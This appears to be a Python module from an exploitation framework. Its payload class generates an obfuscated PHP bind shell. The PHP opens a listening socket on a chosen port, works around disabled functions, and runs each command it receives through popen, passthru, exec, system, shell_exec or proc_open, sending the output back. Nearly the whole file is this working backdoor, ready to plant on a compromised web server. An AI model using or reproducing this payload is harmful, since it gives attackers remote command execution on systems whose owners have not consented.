'''
Created on Jul 24, 2012

@author: aeon
'''

import sys
if "." not in sys.path: 
    sys.path.append(".")

# must include this
from core.core import payload

class payload(payload):
    """
    The generic payload template
    """
    
    def set_title(self):
        self.title = "Generic PHP bind shell payload"
          
    def set_description(self):
        self.description = \
        """
        This payload executes a bind shell on the affected target using obfuscated php."""    
        
    def get_payload_type(self):
        return "bind"
        
    def set_author(self):
        self.author = \
        [
            ['aeon','<aeon.s.flux[at]gmail.com>'],    # zro module
        ]

    # needs fixing
    def register_options(self):
        self.opt_params["lport"] = \
        [
            "4444", "The localport to listen on" 
        ]

    def gen_payload(self):
        
        #print "lport: %d" % (int(self.opt_params["lport"][0]))
        lport = int(self.opt_params["lport"][0])
        
        
        self.shell = \
        """
            @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
            $Bqtnh=@ini_get('disable_functions');
            if(!empty($Bqtnh)){
                $Bqtnh=preg_replace('/[, ]+/', ',', $Bqtnh);
                $Bqtnh=explode(',', $Bqtnh);
                $Bqtnh=array_map('trim', $Bqtnh);
            }else{
                $Bqtnh=array();
            }
            
        $port=%d;

        $scl='socket_create_listen';
        if(is_callable($scl)&&!in_array($scl,$Bqtnh)){
            $sock=@$scl($port);
        }else{
            $sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
            $ret=@socket_bind($sock,0,$port);
            $ret=@socket_listen($sock,5);
        }
        $msgsock=@socket_accept($sock);
        @socket_close($sock);

        while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
        {
            $o = '';
            $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
            if(FALSE===$c){break;}
            if(substr($c,0,3) == 'cd '){
                chdir(substr($c,3,-1));
            } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
                break;
            }else{
                
            $sdkfldkfc = strpos(strtolower(PHP_OS), 'win' );
            if ($sdkfldkfc === false) {
                $c = trim($c, " \n");
                $c=$c." 2>&1\n";
            }
            $cjQdwl='is_callable';
            $yJxfp='in_array';
            
            if($cjQdwl('popen')and!$yJxfp('popen',$Bqtnh)){
                $fp=popen($c,'r');
                $o=NULL;
                if(is_resource($fp)){
                    while(!feof($fp)){
                        $o.=fread($fp,1024);
                    }
                }
                @pclose($fp);
            }else
            if($cjQdwl('passthru')and!$yJxfp('passthru',$Bqtnh)){
                ob_start();
                passthru($c);
                $o=ob_get_contents();
                ob_end_clean();
            }else
            if($cjQdwl('exec')and!$yJxfp('exec',$Bqtnh)){
                $o=array();
                exec($c,$o);
                $o=join(chr(10),$o).chr(10);
            }else
            if($cjQdwl('system')and!$yJxfp('system',$Bqtnh)){
                ob_start();
                system($c);
                $o=ob_get_contents();
                ob_end_clean();
            }else
            if($cjQdwl('shell_exec')and!$yJxfp('shell_exec',$Bqtnh)){
                $o=shell_exec($c);
            }else
            if($cjQdwl('proc_open')and!$yJxfp('proc_open',$Bqtnh)){
                $handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes);
                $o=NULL;
                while(!feof($pipes[1])){
                    $o.=fread($pipes[1],1024);
                }
                @proc_close($handle);
            }else
            {
                $o=0;
            }
        
            }
            @socket_write($msgsock,$o,strlen($o));
        }
        @socket_close($msgsock);
""" % (lport)
        
        return self.shell
        
        
        
        
